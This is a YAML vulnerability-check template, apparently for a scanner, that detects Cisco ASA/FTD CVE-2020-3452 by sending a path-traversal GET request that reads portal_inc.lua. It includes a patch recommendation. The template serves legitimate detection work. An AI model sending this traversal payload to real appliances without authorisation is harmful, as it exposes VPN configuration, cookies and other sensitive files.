app: Cisco ASA
query: body:"cscoe"
meta:
  name: Cisco CVE-2020-3452 Read File
  level: 4
  tags:
    - ultra_vires
  description: Cisco Adaptive Security Appliance (ASA) 防火墙设备以及Cisco Firepower Threat
    Defense (FTD)设备的WEB管理界面存在未授权的目录穿越漏洞和远程任意文件读取漏洞，允许未经身份验证的远程攻击者进行目录遍历攻击并读取目标系统上的敏感文件，此漏洞不能用于获取对ASA或FTD系统文件或底层操作系统(OS)文件的访问，所以只能读取web系统目录的文件，比如webvpn的配置文件、书签、网络cookies、部分网络内容和超文本传输协议网址等信息。
  homepage: http://cisco.com/
  author: 一曲成殇
  references: https://mp.weixin.qq.com/s/zm0NXfBQLbqU0kZ9Uk7qLQ
  solution: |-
    思科已经发布了解决此漏洞的软件更新，建议受影响用户尽快升级到安全版本。
    思科官方链接：https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: INTERNAL_PASSWORD_ENABLED
              type: contains
  create_at: "2021-11-05 23:20:16"
